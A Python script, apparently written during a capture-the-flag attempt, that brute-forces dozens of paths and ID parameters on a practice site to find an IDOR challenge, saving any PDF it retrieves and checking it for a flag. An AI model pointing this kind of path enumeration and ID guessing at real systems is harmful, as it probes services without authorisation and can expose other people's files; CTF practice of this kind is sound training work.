#!/usr/bin/env python3
print("[*] Final attempt to find IDOR challenge")
print("[*] If this doesn't work, the challenge is NOT at hackme1.vulnmachines.com")

import urllib.request
import urllib.error

base = "http://hackme1.vulnmachines.com"

# Every possible combination
paths = [
    # Direct IDOR paths
    "idor", "IDOR", "Idor", "iDor", "idoR", "IDor", "IdoR", "iDOR",
    "idor/", "IDOR/", "Idor/",
    "idor/index.php", "IDOR/index.php", 
    "idor/index.html", "IDOR/index.html",
    "idor/download.php", "IDOR/download.php",
    "idor/file.php", "IDOR/file.php",
    
    # Download endpoints
    "download.php?pdf_id=1", "download.php?pdf_id=2", "download.php?pdf_id=3",
    "download.php?pdfid=1", "download.php?PDF_ID=1",
    "download.php?id=1", "download.php?id=2",
    "download.php?file=1", "download.php?file=1.pdf",
    
    # File endpoints
    "file.php?id=1", "file.php?pdf_id=1", "file.php?file=1",
    "pdf.php?id=1", "pdf.php?pdf_id=1",
    "get.php?id=1", "get.php?pdf_id=1",
    "fetch.php?id=1", "view.php?id=1",
    
    # Direct PDF files
    "1.pdf", "2.pdf", "file.pdf", "document.pdf",
    "idor.pdf", "IDOR.pdf", "flag.pdf",
    "idor/1.pdf", "idor/file.pdf", "IDOR/1.pdf"
]

found_something = False

for path in paths:
    url = f"{base}/{path}"
    try:
        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0')
        
        with urllib.request.urlopen(req, timeout=5) as response:
            content = response.read()
            
            # Check if it's a PDF
            if content[:4] == b'%PDF':
                print(f"\n[!!!] PDF FOUND: {url}")
                print(f"Size: {len(content)} bytes")
                filename = f"/workspace/IDOR_PDF_{path.replace('/','_').replace('?','_')}"
                with open(filename, 'wb') as f:
                    f.write(content)
                print(f"Saved to: {filename}")
                found_something = True
                
                # Look for flag
                if b'vnm{' in content or b'VNM{' in content or b'flag' in content.lower():
                    print("[!!!] PDF CONTAINS FLAG!")
                break
            
            # Check if it's not default Apache (10918 bytes) or 404 (286 bytes)
            elif len(content) not in [10918, 286, 277]:
                if b'idor' in content.lower() or b'pdf' in content.lower() or b'download' in content.lower():
                    print(f"\n[!] Interesting: {url}")
                    print(f"Size: {len(content)} bytes")
                    preview = content[:300].decode('utf-8', errors='ignore')
                    print(f"Preview: {preview}")
                    found_something = True
                    
    except urllib.error.HTTPError as e:
        if e.code not in [404, 403]:
            print(f"{url} - HTTP {e.code}")
    except urllib.error.URLError as e:
        if "timed out" not in str(e):
            print(f"{url} - Error: {e}")
    except Exception as e:
        if "timed out" not in str(e):
            print(f"{url} - Error: {e}")

if not found_something:
    print("\n[-] No IDOR challenge found at hackme1.vulnmachines.com")
    print("[!] The challenge is definitely NOT accessible at this location")
else:
    print("\n[+] Found something! Check the files created")